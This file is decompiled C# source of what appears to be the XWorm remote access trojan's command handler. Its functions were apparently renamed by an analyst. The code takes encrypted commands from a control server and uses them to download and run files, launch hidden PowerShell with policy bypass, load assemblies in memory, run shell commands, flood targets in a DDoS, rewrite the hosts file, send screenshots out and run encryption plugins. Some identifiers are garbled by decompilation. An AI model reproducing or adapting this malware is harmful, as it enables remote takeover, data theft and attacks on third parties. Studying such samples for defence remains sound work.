using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using My;

namespace Stub
{
	// Token: 0x0200000A RID: 10
	public class mw_Communications
	{
		// Token: 0x06000067 RID: 103
		public static void mw_executeC2Command(byte[] jUvXBk6rPHMUnGIxBzD6uSEq)
		{
			try
			{
				string[] array = Strings.Split(mw_Handler.mw_convertByteArrayToString(mw_Handler.mw_decryptByteArrayFromAES(jUvXBk6rPHMUnGIxBzD6uSEq)), Conversions.ToString(mw_Communications.mw_objectVal), -1, CompareMethod.Binary);
				string left = array[0];
				if (Operators.CompareString(left, "pong", false) == 0)
				{
					mw_Utils.mw_isAwaitingPong = false;
					mw_Utils.mw_sendDataOverSocket("pong" + mw_config.mw_XwormTag + Conversions.ToString(mw_Utils.mw_timeSinceLastConn));
					mw_Utils.mw_timeSinceLastConn = 0;
				}
				else if (Operators.CompareString(left, "rec", false) == 0)
				{
					mw_ProcessKillPrevention.mw_unsetProcessCriticality();
					mw_Handler.mw_closeMutex();
					System.Windows.Forms.Application.Restart();
					Environment.Exit(0);
				}
				else if (Operators.CompareString(left, "CLOSE", false) == 0)
				{
					mw_ProcessKillPrevention.mw_unsetProcessCriticality();
					mw_Utils.mw_socket.Shutdown(SocketShutdown.Both);
					mw_Utils.mw_socket.Close();
					Environment.Exit(0);
				}
				else if (Operators.CompareString(left, "uninstall", false) == 0)
				{
					mw_Updater.mw_updateOrDeleteMalware(false, null, null);
				}
				else if (Operators.CompareString(left, "update", false) == 0)
				{
					mw_Updater.mw_updateOrDeleteMalware(true, array[1], mw_Handler.mw_decompressGZIPByteArray(Convert.FromBase64String(array[2])));
				}
				else if (Operators.CompareString(left, "DW", false) == 0)
				{
					mw_Communications.mw_writePS1orExecute(array[1], mw_Handler.mw_decompressGZIPByteArray(Convert.FromBase64String(array[2])));
				}
				else if (Operators.CompareString(left, "FM", false) == 0)
				{
					mw_Communications.mw_loadShellcode(mw_Handler.mw_decompressGZIPByteArray(Convert.FromBase64String(array[1])));
				}
				else if (Operators.CompareString(left, "LN", false) == 0)
				{
					try
					{
						ServicePointManager.Expect100Continue = true;
						ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
						ServicePointManager.DefaultConnectionLimit = 9999;
					}
					catch (Exception ex)
					{
					}
					string fileName = Path.Combine(Path.GetTempPath(), mw_Handler.mw_getRandomLowercaseLetters(6) + array[1]);
					WebClient webClient = new WebClient();
					webClient.DownloadFile(array[2], fileName);
					Process.Start(fileName);
				}
				else if (Operators.CompareString(left, "Urlopen", false) == 0)
				{
					mw_Communications.mw_urlOpen(array[1], false);
				}
				else if (Operators.CompareString(left, "Urlhide", false) == 0)
				{
					mw_Communications.mw_urlOpen(array[1], true);
				}
				else if (Operators.CompareString(left, "PCShutdown", false) == 0)
				{
					Interaction.Shell("shutdown.exe /f /s /t 0", AppWinStyle.Hide, false, -1);
				}
				else if (Operators.CompareString(left, "PCRestart", false) == 0)
				{
					Interaction.Shell("shutdown.exe /f /r /t 0", AppWinStyle.Hide, false, -1);
				}
				else if (Operators.CompareString(left, "PCLogoff", false) == 0)
				{
					Interaction.Shell("shutdown.exe -L", AppWinStyle.Hide, false, -1);
				}
				else if (Operators.CompareString(left, "RunShell", false) == 0)
				{
					Interaction.Shell(array[1], AppWinStyle.Hide, false, -1);
				}
				else if (Operators.CompareString(left, "StartDDos", false) == 0)
				{
					try
					{
						mw_Communications.mw_thread.Abort();
					}
					catch (Exception ex2)
					{
					}
					mw_Communications.mw_thread = new Thread(new ParameterizedThreadStart(mw_Communications.mw_DDOS));
					mw_Communications.mw_thread.Start(array[1]);
				}
				else if (Operators.CompareString(left, "StopDDos", false) == 0)
				{
					try
					{
						mw_Communications.mw_thread.Abort();
					}
					catch (Exception ex3)
					{
					}
				}
				else if (Operators.CompareString(left, "StartReport", false) == 0)
				{
					try
					{
						mw_Communications.mw_thread.Abort();
					}
					catch (Exception ex4)
					{
					}
					mw_Communications.mw_thread = new Thread(new ParameterizedThreadStart(mw_Communications.mw_monitorProcesses));
					mw_Communications.mw_thread.Start(array[1]);
				}
				else if (Operators.CompareString(left, "StopReport", false) == 0)
				{
					try
					{
						mw_Communications.mw_thread.Abort();
					}
					catch (Exception ex5)
					{
					}
				}
				else if (Operators.CompareString(left, "Xchat", false) == 0)
				{
					mw_Utils.mw_sendDataOverSocket(Conversions.ToString(Operators.AddObject(Operators.AddObject("Xchat", mw_Communications.mw_objectVal), mw_Handler.mw_getHWID())));
				}
				else if (Operators.CompareString(left, "Hosts", false) == 0)
				{
					string text = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\drivers\\etc\\hosts";
					mw_Utils.mw_sendDataOverSocket(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject("Hosts", mw_Communications.mw_objectVal), mw_Handler.mw_getHWID()), mw_Communications.mw_objectVal), text), mw_Communications.mw_objectVal), File.ReadAllText(text))));
				}
				else if (Operators.CompareString(left, "Shosts", false) == 0)
				{
					try
					{
						File.WriteAllText(array[1], array[2]);
						mw_Utils.mw_sendDataOverSocket(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject("HostsMSG", mw_Communications.mw_objectVal), mw_Handler.mw_getHWID()), mw_Communications.mw_objectVal), "Modified successfully!")));
					}
					catch (Exception ex6)
					{
						mw_Utils.mw_sendDataOverSocket(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject("HostsErr", mw_Communications.mw_objectVal), mw_Handler.mw_getHWID()), mw_Communications.mw_objectVal), ex6.Message)));
					}
				}
				else if (Operators.CompareString(left, "DDos", false) == 0)
				{
					mw_Utils.mw_sendDataOverSocket("DDos");
				}
				else if (Operators.CompareString(left, "ngrok", false) == 0)
				{
					mw_Utils.mw_sendDataOverSocket(Conversions.ToString(Operators.AddObject(Operators.AddObject("ngrok", mw_Communications.mw_objectVal), mw_Handler.mw_getHWID())));
				}
				else if (Operators.CompareString(left, "plugin", false) == 0)
				{
					mw_Communications.mw_strArr = array;
					if (mw_Handler.mw_getSubkeyValue(array[1]) == null)
					{
						mw_Utils.mw_sendDataOverSocket(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("sendPlugin", mw_Communications.mw_objectVal), array[1])));
					}
					else
					{
						mw_Communications.mw_pluginHandler(mw_Handler.mw_decompressGZIPByteArray(mw_Handler.mw_getSubkeyValue(array[1])));
					}
				}
				else if (Operators.CompareString(left, "savePlugin", false) == 0)
				{
					byte[] array2 = Convert.FromBase64String(array[2]);
					mw_Handler.mw_setRegistryKey(array[1], array2);
					mw_Communications.mw_pluginHandler(mw_Handler.mw_decompressGZIPByteArray(array2));
				}
				else if (Operators.CompareString(left, "RemovePlugins", false) == 0)
				{
					Template.Computer.Registry.CurrentUser.DeleteSubKey(mw_Handler.mw_subkey);
					mw_Communications.mw_obfuscatedSendMessageOverSocket("Plugins Removed!");
				}
				else if (Operators.CompareString(left, "OfflineGet", false) == 0)
				{
					mw_Utils.mw_sendDataOverSocket(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("OfflineGet", mw_Communications.mw_objectVal), mw_Handler.mw_getHWID()), mw_Communications.mw_objectVal), File.ReadAllText(mw_config.mw_logFile))));
				}
				else if (Operators.CompareString(left, "$Cap", false) == 0)
				{
					try
					{
						try
						{
							if (!mw_Handler.mw_bool)
							{
								mw_Handler.SetProcessDpiAwareness(2);
								mw_Handler.mw_bool = true;
							}
						}
						catch (Exception ex7)
						{
						}
						Rectangle bounds = Screen.PrimaryScreen.Bounds;
						Rectangle bounds2 = Screen.PrimaryScreen.Bounds;
						Bitmap bitmap = new Bitmap(bounds2.Width, bounds.Height, PixelFormat.Format16bppRgb555);
						Graphics graphics = Graphics.FromImage(bitmap);
						Size blockRegionSize = new Size(bitmap.Width, bitmap.Height);
						graphics.CopyFromScreen(0, 0, 0, 0, blockRegionSize, CopyPixelOperation.SourceCopy);
						MemoryStream memoryStream = new MemoryStream();
						Bitmap bitmap2 = new Bitmap(256, 156);
						Graphics graphics2 = Graphics.FromImage(bitmap2);
						Graphics graphics3 = graphics2;
						Image image = bitmap;
						bounds2 = new Rectangle(0, 0, 256, 156);
						Rectangle destRect = bounds2;
						Rectangle srcRect = new Rectangle(0, 0, bitmap.Width, bitmap.Height);
						graphics3.DrawImage(image, destRect, srcRect, GraphicsUnit.Pixel);
						bitmap2.Save(memoryStream, ImageFormat.Jpeg);
						mw_Utils.mw_sendDataOverSocket(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("#CAP", mw_Communications.mw_objectVal), mw_Handler.mw_getHWID()), mw_Communications.mw_objectVal), Convert.ToBase64String(mw_Handler.mw_compressByteArrayToGZIP(memoryStream.ToArray())))));
						try
						{
							graphics.Dispose();
							memoryStream.Dispose();
							bitmap2.Dispose();
							graphics2.Dispose();
							bitmap.Dispose();
						}
						catch (Exception ex8)
						{
						}
					}
					catch (Exception ex9)
					{
					}
				}
			}
			catch (Exception ex10)
			{
				mw_Communications.mw_reportError(ex10.Message);
			}
		}

		// Token: 0x06000068 RID: 104
		public static void mw_pluginHandler(byte[] 5IoCY2WXx2eULlAwBUt02IVc)
		{
			try
			{
				foreach (Type type in AppDomain.CurrentDomain.Load(5IoCY2WXx2eULlAwBUt02IVc).GetTypes())
				{
					if (Operators.CompareString(type.Name, "Plugin", false) == 0)
					{
						foreach (MethodInfo instance in type.GetMethods())
						{
							if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(instance, null, "Name", new object[0], null, null, null), "Run", false))
							{
								NewLateBinding.LateCall(instance, null, "Invoke", new object[]
								{
									null,
									new object[]
									{
										mw_config.mw_currentC2IP,
										mw_config.mw_socketPort,
										mw_config.mw_XwormTag,
										mw_config.mw_AESKey,
										mw_Handler.mw_getHWID()
									}
								}, null, null, null, true);
								return;
							}
							if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(instance, null, "Name", new object[0], null, null, null), "RunRecovery", false))
							{
								mw_Utils.mw_sendDataOverSocket(Conversions.ToString(Operators.ConcatenateObject("Recovery" + mw_config.mw_XwormTag + mw_Handler.mw_getHWID() + mw_config.mw_XwormTag + Conversions.ToString(Convert.ToInt32(mw_Communications.mw_strArr[2])) + mw_config.mw_XwormTag, NewLateBinding.LateGet(instance, null, "Invoke", new object[]
								{
									null,
									new object[]
									{
										Convert.ToInt32(mw_Communications.mw_strArr[2])
									}
								}, null, null, null))));
								return;
							}
							if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(instance, null, "Name", new object[0], null, null, null), "RunOptions", false))
							{
								string text = Conversions.ToString(NewLateBinding.LateGet(instance, null, "Invoke", new object[]
								{
									null,
									new object[]
									{
										mw_Communications.mw_strArr[2]
									}
								}, null, null, null));
								if (text.StartsWith("Error"))
								{
									mw_Communications.mw_reportError(text);
								}
								else
								{
									mw_Communications.mw_obfuscatedSendMessageOverSocket(text);
								}
								return;
							}
							if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(instance, null, "Name", new object[0], null, null, null), "injRun", false))
							{
								if (File.Exists(mw_Communications.mw_strArr[2]))
								{
									NewLateBinding.LateCall(instance, null, "Invoke", new object[]
									{
										null,
										new object[]
										{
											mw_Communications.mw_strArr[2],
											mw_Handler.mw_decompressGZIPByteArray(Convert.FromBase64String(mw_Communications.mw_strArr[3]))
										}
									}, null, null, null, true);
								}
								return;
							}
							if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(instance, null, "Name", new object[0], null, null, null), "UACFunc", false))
							{
								mw_Communications.mw_reportError(Conversions.ToString(NewLateBinding.LateGet(instance, null, "Invoke", new object[]
								{
									null,
									new object[]
									{
										Convert.ToInt32(mw_Communications.mw_strArr[2])
									}
								}, null, null, null)));
								return;
							}
							if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(instance, null, "Name", new object[0], null, null, null), "ngrok", false))
							{
								NewLateBinding.LateCall(instance, null, "Invoke", new object[]
								{
									null,
									new object[]
									{
										mw_Communications.mw_strArr[2]
									}
								}, null, null, null, true);
								mw_Utils.mw_sendDataOverSocket(Conversions.ToString(Operators.AddObject(Operators.AddObject("ngrok+", mw_Communications.mw_objectVal), mw_Handler.mw_getHWID())));
								return;
							}
							if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(instance, null, "Name", new object[0], null, null, null), "ENC", false))
							{
								if (Convert.ToBoolean(mw_Communications.mw_strArr[2]))
								{
									if (mw_Communications.mw_int != 1)
									{
										mw_Communications.mw_int = 1;
										mw_Communications.mw_obfuscatedSendMessageOverSocket(Conversions.ToString(NewLateBinding.LateGet(instance, null, "Invoke", new object[]
										{
											null,
											new object[]
											{
												mw_Handler.mw_getHWID(),
												mw_Handler.mw_decompressGZIPByteArray(Convert.FromBase64String(mw_Communications.mw_strArr[3])),
												mw_Communications.mw_strArr[4],
												mw_Communications.mw_strArr[5],
												mw_Communications.mw_strArr[6]
											}
										}, null, null, null)));
										mw_Communications.mw_int = 2;
									}
									return;
								}
							}
							else if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(instance, null, "Name", new object[0], null, null, null), "DEC", false) && !Convert.ToBoolean(mw_Communications.mw_strArr[2]))
							{
								if (mw_Communications.mw_int == 2)
								{
									mw_Communications.mw_int = 1;
									mw_Communications.mw_obfuscatedSendMessageOverSocket(Conversions.ToString(NewLateBinding.LateGet(instance, null, "Invoke", new object[]
									{
										null,
										new object[]
										{
											mw_Handler.mw_getHWID()
										}
									}, null, null, null)));
									mw_Communications.mw_int = 0;
								}
								return;
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				mw_Communications.mw_reportError("Plugin Error! " + ex.Message);
			}
		}

		// Token: 0x06000069 RID: 105
		public static void mw_obfuscatedSendMessageOverSocket(string value)
		{
			try
			{
				mw_Utils.mw_sendDataOverSocket(Conversions.ToString(Operators.AddObject(Operators.AddObject("Msg", mw_Communications.mw_objectVal), value)));
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600006A RID: 106
		public static void mw_reportError(string cpFo3EGRKyC4MZ3XjDNC22TN)
		{
			try
			{
				mw_Utils.mw_sendDataOverSocket(Conversions.ToString(Operators.AddObject(Operators.AddObject("Error", mw_Communications.mw_objectVal), cpFo3EGRKyC4MZ3XjDNC22TN)));
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600006B RID: 107
		public static void mw_makePostRequest(string connectionString)
		{
			checked
			{
				try
				{
					string Host = connectionString.Split(new char[]
					{
						':'
					})[0];
					string Port = connectionString.Split(new char[]
					{
						':'
					})[1];
					int num = Convert.ToInt32(connectionString.Split(new char[]
					{
						':'
					})[2]) * 60;
					TimeSpan t = TimeSpan.FromSeconds((double)num);
					Stopwatch stopwatch = new Stopwatch();
					stopwatch.Start();
					while (t > stopwatch.Elapsed && mw_Utils.mw_hasSocketAsyncCallSucceeded)
					{
						int num2 = 0;
						do
						{
							Thread thread = new Thread(delegate ()
							{
								try
								{
									Socket socket = new Socket(2, SocketType.Stream, ProtocolType.Tcp);
									socket.Connect(Host, Convert.ToInt32(Port));
									string s = string.Concat(new string[]
									{
										"POST / HTTP/1.1\r\nHost: ",
										Host,
										"\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: ",
										mw_Handler.mw_userAgentList[new Random().Next(mw_Handler.mw_userAgentList.Length)],
										"\r\nContent-length: 5235\r\n\r\n"
									});
									byte[] bytes = Encoding.UTF8.GetBytes(s);
									socket.Send(bytes, 0, bytes.Length, SocketFlags.None);
									Thread.Sleep(2500);
									socket.Dispose();
								}
								catch (Exception ex)
								{
								}
							});
							thread.Start();
							num2++;
						}
						while (num2 <= 19);
						Thread.Sleep(5000);
					}
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x0600006C RID: 108
		public static void mw_monitorProcessList(string processList)
		{
			List<string> list = new List<string>();
			foreach (string instance in Strings.Split(processList, ",", -1, CompareMethod.Binary))
			{
				list.Add(Conversions.ToString(NewLateBinding.LateGet(instance, null, "ToLower", new object[0], null, null, null)));
			}
			int num = 30;
			checked
			{
				while (mw_Utils.mw_hasSocketAsyncCallSucceeded)
				{
					foreach (Process process in Process.GetProcesses())
					{
						if (!string.IsNullOrEmpty(process.MainWindowTitle))
						{
							if (Enumerable.Any<string>(list, new Func<string, bool>(process.MainWindowTitle.ToLower().Contains)) && num > 30)
							{
								num = 0;
								mw_Communications.mw_obfuscatedSendMessageOverSocket("Open [" + process.MainWindowTitle.ToLower() + "]");
							}
						}
					}
					num++;
					Thread.Sleep(1000);
				}
			}
		}

		// Token: 0x0600006D RID: 109
		public static void mw_urlOpen(string payload, bool hideBrowser)
		{
			if (hideBrowser)
			{
				try
				{
					ServicePointManager.Expect100Continue = true;
					ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
					ServicePointManager.DefaultConnectionLimit = 9999;
				}
				catch (Exception ex)
				{
				}
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(payload);
				httpWebRequest.UserAgent = mw_Handler.mw_userAgentList[new Random().Next(mw_Handler.mw_userAgentList.Length)];
				httpWebRequest.AllowAutoRedirect = true;
				httpWebRequest.Timeout = 10000;
				httpWebRequest.Method = "GET";
				using ((HttpWebResponse)httpWebRequest.GetResponse())
				{
				}
			}
			else
			{
				Process.Start(payload);
			}
		}

		// Token: 0x0600006E RID: 110
		[DllImport("avicap32.dll")]
		public static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, int hwndParent, int nID);

		// Token: 0x0600006F RID: 111
		[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern bool capGetDriverDescriptionA(short wDriverIndex, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

		// Token: 0x06000070 RID: 112
		public static bool mw_isVideoCapCapable()
		{
			checked
			{
				try
				{
					int num = 0;
					for (; ; )
					{
						string text = null;
						short wDriverIndex = (short)num;
						string text2 = Strings.Space(100);
						if (mw_Communications.capGetDriverDescriptionA(wDriverIndex, ref text2, 100, ref text, 100))
						{
							break;
						}
						num++;
						if (num > 4)
						{
							goto Block_3;
						}
					}
					return true;
				Block_3:;
				}
				catch (Exception ex)
				{
				}
				return false;
			}
		}

		// Token: 0x06000071 RID: 113
		private static void mw_writePS1orExecute(string filename, byte[] content)
		{
			object obj = Path.Combine(Path.GetTempPath(), mw_Handler.mw_getRandomLowercaseLetters(6) + filename);
			File.WriteAllBytes(Conversions.ToString(obj), content);
			Thread.Sleep(500);
			if (filename.ToLower().EndsWith(".ps1"))
			{
				Process process = Process.Start(new ProcessStartInfo("powershell.exe")
				{
					WindowStyle = ProcessWindowStyle.Hidden,
					Arguments = Conversions.ToString(Operators.AddObject(Operators.AddObject("-ExecutionPolicy Bypass -File \"", obj), "\""))
				});
			}
			else
			{
				object instance = null;
				Type typeFromHandle = typeof(Process);
				string memberName = "Start";
				object[] array = new object[]
				{
					RuntimeHelpers.GetObjectValue(obj)
				};
				object[] arguments = array;
				string[] argumentNames = null;
				Type[] typeArguments = null;
				bool[] array2 = new bool[]
				{
					true
				};
				NewLateBinding.LateCall(instance, typeFromHandle, memberName, arguments, argumentNames, typeArguments, array2, true);
				if (array2[0])
				{
					obj = RuntimeHelpers.GetObjectValue(array[0]);
				}
			}
		}

		// Token: 0x06000072 RID: 114
		private static object mw_loadShellcode(byte[] RUcXCf4Rgni21mRwXD3B0WmF)
		{
			try
			{
				Assembly assembly = AppDomain.CurrentDomain.Load(RUcXCf4Rgni21mRwXD3B0WmF);
				MethodInfo entryPoint = assembly.EntryPoint;
				object objectValue = RuntimeHelpers.GetObjectValue(assembly.CreateInstance(entryPoint.Name));
				object[] parameters = new object[1];
				if (entryPoint.GetParameters().Length == 0)
				{
					parameters = null;
				}
				entryPoint.Invoke(RuntimeHelpers.GetObjectValue(objectValue), parameters);
			}
			catch (Exception ex)
			{
			}
			object result;
			return result;
		}

		// Token: 0x06000073 RID: 115
		[CompilerGenerated]
		[DebuggerStepThrough]
		private static void mw_DDOS(object qFD493zgwnZ1PpAbZ2IXp9LQ)
		{
			mw_Communications.mw_makePostRequest(Conversions.ToString(qFD493zgwnZ1PpAbZ2IXp9LQ));
		}

		// Token: 0x06000074 RID: 116
		[DebuggerStepThrough]
		[CompilerGenerated]
		private static void mw_monitorProcesses(object fRtbbbq45cs7tdvcVQs0U3rI)
		{
			mw_Communications.mw_monitorProcessList(Conversions.ToString(fRtbbbq45cs7tdvcVQs0U3rI));
		}

		// Token: 0x0400001E RID: 30
		private static readonly object mw_objectVal = RuntimeHelpers.GetObjectValue(mw_Utils.mw_XwormTag);

		// Token: 0x0400001F RID: 31
		public static string[] mw_strArr;

		// Token: 0x04000020 RID: 32
		public static int mw_int;

		// Token: 0x04000021 RID: 33
		public static Thread mw_thread;

		// Token: 0x04000022 RID: 34
		public static Thread mw_thread;

		// Token: 0x04000023 RID: 35
		public static IntPtr mw_intPtr;
	}
}
